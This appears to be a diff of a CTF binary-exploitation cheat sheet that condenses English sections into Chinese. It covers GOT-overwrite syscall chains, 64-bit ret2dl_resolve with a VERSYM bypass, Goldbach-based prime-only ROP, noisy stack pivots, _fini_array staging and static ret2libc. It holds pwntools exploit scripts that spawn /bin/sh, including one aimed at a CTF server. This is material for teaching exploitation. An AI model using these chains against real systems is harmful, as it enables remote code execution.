-read_bytes = read_memory(read_addr, 0x100)
-
-# Step 3: Find syscall opcode (0x0f 0x05) within read()
-syscall_offset = read_bytes.index(b'\x0f\x05')
-syscall_addr = read_addr + syscall_offset
-log.info(f"syscall @ {hex(syscall_addr)}")
-
-# Step 4: Overwrite an unused GOT entry (e.g., srand) with syscall address
-write_got(elf.got['srand'], syscall_addr)
-
-# Step 5: Build ROP chain for execve via syscall
-# Trick: read() return value sets rax, so read exactly 59 bytes for __NR_execve
-pop_rdi = rop_gadget  # pop rdi; ret
-pop_rsi = rop_gadget  # pop rsi; ret
-pop_rdx = rop_gadget  # pop rdx; ret
-
-payload = flat(
-    pop_rdi, 0,                    # fd = stdin
-    pop_rsi, bss_addr,             # buf = writable BSS
-    pop_rdx, 59,                   # count = 59 = __NR_execve
-    elf.plt['read'],               # read(0, bss, 59) → rax = 59
-    pop_rdi, binsh_addr,           # rdi = "/bin/sh"
-    pop_rsi, 0,                    # rsi = NULL
-    pop_rdx, 0,                    # rdx = NULL
-    elf.plt['srand'],              # calls syscall (GOT overwritten)
-    # rax=59, rdi="/bin/sh", rsi=0, rdx=0 → execve("/bin/sh", NULL, NULL)
-)
-io.sendline(payload)
-
-# Send exactly 59 bytes so read() returns 59 (sets rax = __NR_execve)
-io.send(b'A' * 59)
-```
-
-**Why read() always contains syscall:**
 ```text
-read() in libc is a thin wrapper around the syscall instruction:
-  mov eax, 0        ; SYS_read
-  syscall            ; <-- this is what we're scanning for
+read() 是 syscall 的薄封装：
+  mov eax, 0
+  syscall          ← 要找的 0f 05
   cmp rax, -4096
-  ...
-The bytes 0x0f 0x05 (syscall) are guaranteed to exist within read()
 ```
 
-**Key insight:** Every libc function's code section contains useful gadgets. `read()` always contains a `syscall` instruction internally. By leaking a GOT entry and reading the function's machine code, you find `syscall` without knowing the libc version. The `read()` syscall return value conveniently sets `rax` to the number of bytes read — send exactly 59 bytes (`__NR_execve`) to set up the syscall number. This eliminates the need for a `pop rax; ret` gadget.
+```python
+read_addr = leak_got(elf.got['read'])
+buf = read_memory(read_addr, 0x100)
+syscall_addr = read_addr + buf.index(b'\x0f\x05')
+write_got(elf.got['srand'], syscall_addr)     # 塞进没人用的 GOT 槽
+```
 
-**When to recognize:** Partial RELRO (GOT writable), no libc version available, but you can leak GOT entries and read arbitrary memory. Any function that performs a syscall internally (`read`, `write`, `open`, `mmap`) contains the `0f 05` bytes. `read()` is preferred because its return value naturally controls `rax`.
+然后 `rax` 用 `read()` 的返回值控制：**正好发 59 字节**，`read` 返回 59 = `__NR_execve`。
 
-**References:** Codegate 2018
+判据：Partial RELRO（GOT 可写）、无 libc 版本、有任意读。任何内部执行 syscall 的函数（`read`/`write`/`open`/`mmap`）都有 `0f 05`，`read` 优先因为返回值天然可控 `rax`。
 
----
+## 12. ret2dl_resolve（64 位）
 
-## ret2dl_resolve 64-bit (Codegate 2018)
+完全拿不到 libc 基址，但 Partial RELRO，且能往 BSS 写任意内容——让动态链接器自己去解析 `system`。
 
-**Pattern:** Forge fake `Elf64_Rela`, `Elf64_Sym`, and dynstr entries in writable memory (BSS) to trick the dynamic linker into resolving an arbitrary libc function (e.g., `system`) without knowing the libc base address. The 64-bit variant requires bypassing VERSYM checks by NULLing the version table pointer in the link_map.
+解析链路：
 
-**How dynamic resolution works:**
 ```text
 PLT stub → _dl_runtime_resolve(link_map, reloc_index)
-  1. Look up Elf64_Rela at .rela.plt[reloc_index]
-  2. Extract symbol index from r_info
-  3. Look up Elf64_Sym at .dynsym[sym_index]
-  4. Read symbol name from .dynstr + st_name offset
-  5. Search loaded libraries for that symbol name
-  6. [64-bit only] Check version via .gnu.version[sym_index]  ← must bypass
-  7. Write resolved address to GOT, jump to it
+  1. 取 .rela.plt[reloc_index] 的 Elf64_Rela
+  2. 从 r_info 高位取符号索引
+  3. 取 .dynsym[idx] 的 Elf64_Sym
+  4. 用 st_name 在 .dynstr 里取符号名
+  5. 在各已加载库里搜这个名字
+  6. [64 位专属] 查 .gnu.version[idx] 校验版本  ← 必须绕
+  7. 写进 GOT 并跳过去
 ```
 
-**Forging the structures:**
+伪造三个结构（每个 24 字节，注意索引是按「偏移 / 24」算的）：
+
 ```python
-from pwn import *
-
-# Target: resolve system() by forging resolution structures in BSS
-BSS = 0x601000          # writable memory
-STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
-SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
-JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')
-
-# Calculate offsets so forged structures are self-consistent
-fake_rela_addr = BSS + 0x100
-fake_sym_addr = BSS + 0x200
-fake_str_addr = BSS + 0x300
-
-# Forged Elf64_Sym (24 bytes)
-# st_name: offset into dynstr where "system\x00" lives
-# st_info: STT_FUNC | STB_GLOBAL
-# st_other, st_shndx: 0
-# st_value, st_size: 0 (unresolved)
-sym_index = (fake_sym_addr - SYMTAB) // 24  # index into symtab
-fake_sym = flat(
-    p32(fake_str_addr - STRTAB),  # st_name (offset to "system" in dynstr)
-    p8(0x12),                      # st_info = STT_FUNC | STB_GLOBAL<<4
-    p8(0),                         # st_other
-    p16(0),                        # st_shndx = SHN_UNDEF
-    p64(0),                        # st_value
-    p64(0),                        # st_size
-)
-
-# Forged Elf64_Rela (24 bytes)
-# r_offset: GOT slot to write resolved address
-# r_info: (sym_index << 32) | R_X86_64_JUMP_SLOT
-# r_addend: 0
+sym_index   = (fake_sym_addr  - SYMTAB) // 24
 reloc_index = (fake_rela_addr - JMPREL) // 24
-fake_rela = flat(
-    p64(BSS + 0x400),                      # r_offset (writable GOT slot)
-    p64((sym_index << 32) | 7),            # r_info: sym_idx | R_X86_64_JUMP_SLOT
-    p64(0),                                 # r_addend
-)
 
-# Forged dynstr entry
-fake_str = b"system\x00"
-
-# Write all structures to BSS via ROP chain
-# ...
-
-# CRITICAL: Bypass VERSYM check for 64-bit
-# Overwrite link_map->l_info[DT_VERSYM] with NULL
-# This skips version validation entirely
-# link_map address can be read from GOT[1]
-link_map_addr = read_got(1)  # GOT[1] = link_map pointer
-# l_info[DT_VERSYM] is at link_map + 0x1c8 (glibc-dependent)
-versym_ptr = link_map_addr + 0x1c8
-write_memory(versym_ptr, p64(0))  # NULL → skip version check
-
-# Trigger resolution: call PLT stub with forged reloc_index
-# _dl_runtime_resolve follows our forged chain:
-#   fake Rela → fake Sym → fake dynstr "system"
-#   → resolves system() → writes to fake GOT slot → jumps to system()
+fake_sym  = flat(p32(fake_str_addr - STRTAB),  # st_name → "system"
+                 p8(0x12),                      # STT_FUNC | STB_GLOBAL<<4
+                 p8(0), p16(0),                 # st_other, st_shndx=UNDEF
+                 p64(0), p64(0))                # st_value, st_size
+fake_rela = flat(p64(BSS + 0x400),              # r_offset → 可写 GOT 槽
+                 p64((sym_index << 32) | 7),    # R_X86_64_JUMP_SLOT
+                 p64(0))
+fake_str  = b"system\x00"
 ```
 
-**ROP chain to trigger:**
+**64 位的难点全在 VERSYM**。把 `link_map->l_info[DT_VERSYM]` 置 NULL 就跳过版本校验：
+
 ```python
-# After writing fake structures to BSS:
-# Push reloc_index and jump to PLT[0] (the universal resolver stub)
-plt_stub = elf.get_section_by_name('.plt').header.sh_addr
-
-payload = flat(
-    pop_rdi, binsh_addr,           # rdi = "/bin/sh" for system()
-    plt_stub,                       # push link_map; jmp _dl_runtime_resolve
-    p64(reloc_index),              # relocation index into forged .rela.plt
-)
+link_map = read_got(1)                    # GOT[1] 就是 link_map 指针
+write_memory(link_map + 0x1c8, p64(0))    # 偏移随 glibc 版本变，需确认
 ```
 
-**Key insight:** 64-bit ret2dl_resolve is harder than 32-bit because of VERSYM checks. Overwrite `link_map->l_info[DT_VERSYM]` with NULL to skip version validation entirely. Then the standard approach works: forge Rela -> Sym -> dynstr chain in writable memory, trigger resolution via PLT stub with crafted reloc index. This resolves arbitrary libc functions without knowing the libc base — the dynamic linker does the work for you.
+最后 `pop rdi` 设好参数 → 跳 `PLT[0]`（通用解析桩）→ 紧跟一个 `p64(reloc_index)`。
 
-**When to recognize:** No libc leak available, Partial RELRO (PLT/GOT writable), binary has enough ROP gadgets to write to BSS and control function arguments. Works on any glibc version (the VERSYM bypass via NULL is universal). Prefer this over blind libc identification when the remote libc version is completely unknown.
+判据：无 libc leak、Partial RELRO、gadget 够写 BSS。**远程 libc 完全未知时，这比盲猜版本靠谱。**
 
-**References:** Codegate 2018
+## 13. 数论约束下的 ROP
 
----
+栈上每个字必须满足某个数论性质（如必须素数）时，直接写 gadget 地址必然失败。
 
-## Prime-Only ROP via Goldbach Decomposition (PlaidCTF 2018)
+**通法：把目标值写成若干「合法值」的和，再加一个极小的合并 gadget 在 `ret` 前还原。**
 
-**Pattern:** Challenge constrains every stack word written by the attacker to be a prime number (`miller_rabin(val)` must return true on each slot). Direct gadget addresses are almost never prime, so the ROP chain looks impossible to build.
-
-**Exploit:** Goldbach's conjecture guarantees every even integer > 2 is the sum of two primes. Represent each target gadget address `g` as `g = p1 + p2` where `p1, p2` are primes, and write them into adjacent stack slots. A small "prime adder" gadget (`pop rax; pop rdx; add rax, rdx; push rax; ret` or a read-modify-write into the stack) consolidates the two halves into the real gadget pointer right before the `ret` that consumes it.
+Goldbach 保证任意偶数 > 2 可拆成两素数之和：
 
 ```python
 from sympy import isprime, nextprime
 
 def prime_split(addr):
-    # Returns (p1, p2) with p1 + p2 == addr and both prime
-    if addr % 2:  # odd: (2, addr-2) if addr-2 prime, else search
-        if isprime(addr - 2): return (2, addr - 2)
+    if addr % 2 and isprime(addr - 2):
+        return (2, addr - 2)
     p1 = 3
     while not (isprime(p1) and isprime(addr - p1)):
         p1 = nextprime(p1)
     return (p1, addr - p1)
 ```
 
-Chain multiple `(p1, p2, adder)` triples to synthesize arbitrary gadget addresses while every raw stack word still passes the primality filter.
+每三个栈槽放 `(p1, p2, 合并 gadget)`。合并 gadget 形如 `pop rax; pop rdx; add rax, rdx; push rax; ret`，或任何能「把相邻两槽合成一槽再 ret」的序列。
 
-**Key insight:** Number-theoretic constraints on stack contents can always be defeated by writing a value as the sum/XOR/product of admissible parts and adding a tiny reducer gadget that recombines them at runtime. Goldbach gives a constructive two-term decomposition for addresses; Lagrange's four-square theorem works similarly for constraints that require perfect squares.
+同类约束换定理：要求完全平方 → 拉格朗日四平方和；要求非零 → 拆成两非零之和。
 
-**References:** PlaidCTF 2018 — writeup 10017
+## 14. 带垃圾指令的枢轴 gadget
 
----
-
-## Imperfect-Gadget Stack Pivot (RITSEC 2018)
-
-**Pattern:** Classic stack pivots use `leave; ret` or `xchg esp, eax; ret`, but sometimes the only usable gadget has benign middle instructions. A gadget like `pop ebp; add al, 0x89; pop esp; and al, 0x30; add esp, 0x24; ret` still pivots `esp` — the `add al`/`and al` side effects do not corrupt `esp` and the trailing `add esp, 0x24` just skips 9 slots you pre-pad with junk.
+唯一的枢轴 gadget 中间夹着一堆无关指令：
 
 ```asm
-0x80c0620: pop ebp ; add al, 0x89 ; pop esp ; and al, 0x30 ; add esp, 0x24 ; ret
+0x80c0620: pop ebp ; add al,0x89 ; pop esp ; and al,0x30 ; add esp,0x24 ; ret
 ```
 
-Place a controlled heap address at the correct slot so `pop esp` lands you on a fake stack, then budget nine dummy dwords before the real chain to absorb `add esp, 0x24`.
+**别急着放弃**。逐行看：`add al`/`and al` 只动 `al`，不碰 `esp`；末尾 `add esp, 0x24` 只是跳过 9 个槽——前面填 9 个垃圾 dword 就行。
 
-**Key insight:** Stop rejecting gadgets because they are noisy. Walk each gadget line-by-line; if none of the instructions clobber `esp`, the gadget still pivots even with spurious arithmetic.
+判据：**只要没有指令写 `esp`，这个 gadget 就能枢轴**，其余副作用都可以用 padding 吸收。
 
-**References:** RITSEC CTF 2018 — Yet Another HR Management Framework, writeup 12287
+## 15. 输入会被反转时写 shellcode
 
----
-
-## _fini_array Double-Entry Staged ROP (Insomnihack 2019)
-
-**Pattern:** Statically-linked binary has no PLT/GOT to hijack. However, `_fini_array` stores pointers called on `exit()`. Overwrite both entries so the first invocation runs `do_overwrite` (a gadget that lets you stage more bytes) and the second runs it again, letting you append ROP piece-by-piece across successive exits.
-
-```text
-_fini_array[0] = do_overwrite   # stage 1: write next segment
-_fini_array[1] = do_overwrite   # stage 2: write final segment + trigger
-```
-
-Use `add rsp, N; ret` pivots to walk below the current `rsp` so each stage concatenates onto the previous ROP frame.
-
-**Key insight:** `_fini_array` is effectively a re-entrant callback table in static binaries. Two entries plus any "write N bytes to addr" primitive gives you unlimited ROP depth without restarting the process.
-
-**References:** Insomnihack teaser 2019 — onewrite, writeup 12912
-
----
-
-## ret2libc via Statically-Linked libc + Embedded /bin/sh String (TAMUctf 2019)
-
-**Pattern (pwn5):** Argument is copied into a fixed-size buffer with a 3-character *display* limit — but the underlying `gets()` still reads the full line, yielding a stack overflow 17 bytes past the buffer. The overflow slot is too small for a multi-gadget ROP chain, and no obvious `/bin/sh` appears at predictable addresses. Because the binary is **statically linked**, `system`, `exit`, and an embedded `"/bin/sh"` string from the libc blob all live at fixed addresses — one ret2libc call fits in the overflow slot.
+程序把输入 buffer 反转后才返回。做法：**反着写 shellcode**，再用 `sub rsp,0x10; jmp *%rsp` 落地。
 
 ```python
-from pwn import *
-
-# Addresses resolved from the static binary itself:
-#   (gdb) info address system  -> 0x0804ee30
-#   (gdb) info address exit    -> 0x0804e330
-#   0x080bc140: "/bin/sh"              (pulled from rodata / libc blob)
-
-system  = 0x0804ee30
-exit_a  = 0x0804e330
-binsh   = 0x080bc140
-
-# Overflow reaches saved EIP at cyclic offset 17 (cyclic -l on the crash)
-payload  = cyclic(17)
-payload += p32(system)   # ret -> system
-payload += p32(exit_a)   # system's return addr -> exit (avoid SIGSEGV post-shell)
-payload += p32(binsh)    # system's first arg
-
-# Keep the process alive after the shell spawns by piping stdin:
-# (python -c "..."; cat) | nc pwn.tamuctf.com 4325
-io = remote('pwn.tamuctf.com', 4325)
-io.sendline(payload)
-io.interactive()
+# 1. 泄地址破 PIE
+# 2. 找 sub rsp, 0x10; jmp *%rsp
+# 3. shellcode 与 rip 覆盖字节都预先反转
+# 4. 6 字节部分覆盖 RIP（高 2 字节同映射，且避开 0x00）
+# 5. 落地后先 jmp short 跳进 NOP sled 再进 shellcode
 ```
 
-**Key insight:** Static linking turns every libc symbol into a fixed-offset target inside the binary and drags the entire libc string table (including `"/bin/sh"`) along for free — no leak, no ROPgadget hunting for `/bin/sh`, no dynamic linker games. Whenever `checksec` shows "No PIE" AND `file` reports "statically linked", a 12-byte payload (`system; exit; &/bin/sh`) is usually enough, even in overflow windows too small for a 2-gadget chain. Confirm by `strings -a binary | grep -n /bin/sh` and `nm binary | grep ' T system'`.
+`scanf("%s")` 不能含 `\x00`，所以必须走部分覆盖 + 短跳 + NOP sled，不能用多地址链。
 
-**References:** TAMUctf 2019 — pwn5, writeup 13428
-
----
-
-## Useful Commands
+## 16. 命令速查
 
 ```bash
-one_gadget libc.so.6           # Find one-shot gadgets
-ropper -f binary               # Find ROP gadgets
-ROPgadget --binary binary      # Alternative gadget finder
-seccomp-tools dump ./binary    # Check seccomp rules
+one_gadget libc.so.6           # 一发入魂 gadget
+ropper -f binary               # gadget 搜索
+ROPgadget --binary binary      # 另一种搜索
+seccomp-tools dump ./binary    # 看 seccomp 规则
 ```
+
+## 17. 纪律
+
+- **先 `seccomp-tools dump`**。挡住你的是 seccomp 还是 gadget 缺失，决定了完全不同的路线，别猜。
+- **溢出窗口小先查静态链接**。静态链接的 12 字节 `system;exit;&binsh` 是最省事的解，先排除它再谈枢轴。
+- **没有 gadget 不等于打不动**：vDSO、vsyscall、`read()` 函数体、`_fini_array` 都是 gadget 的替代来源。
+- **约束型题（UTF-8 / 素数 / 反转）先找「表示层」绕过**，别去改语义——SROP 减 gadget、Goldbach 拆值、反写 shellcode 都是表示层手法。
+- **`ret2dl_resolve` 的 VERSYM 偏移随 glibc 变**，用之前先在目标 libc 上确认 `l_info[DT_VERSYM]` 的实际偏移。
